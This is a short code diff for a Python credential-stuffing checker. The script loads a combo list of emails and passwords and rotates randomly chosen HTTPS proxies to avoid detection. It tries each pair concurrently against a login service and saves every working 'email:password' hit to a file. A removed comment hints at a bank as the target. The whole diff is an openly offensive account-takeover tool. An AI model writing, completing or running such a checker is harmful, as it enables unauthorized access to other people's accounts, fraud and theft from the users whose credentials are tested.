@@ -1,9 +1,9 @@
 from lib import request, loader
 from random import choice
 from concurrent import futures
-#from lib.parse import save
 
 loader.load_combo(your combo here)
+loader.load_proxies('https', 'proxies.txt')
 
 def check(email, password):
    proxy = choice(loader.proxies)
@@ -12,6 +12,5 @@ def check(email, password):
    block_one.success(save=True, statement='Ok=1', save_this=(f'{email}:{password}\n'))
    print(f'success : {request.success} fail : {request.fail}\n')
 
-#check('hsbc', 'hehfjd')
-#
+
 futures.ThreadPoolExecutor().map(check, loader.users, loader.passwords)
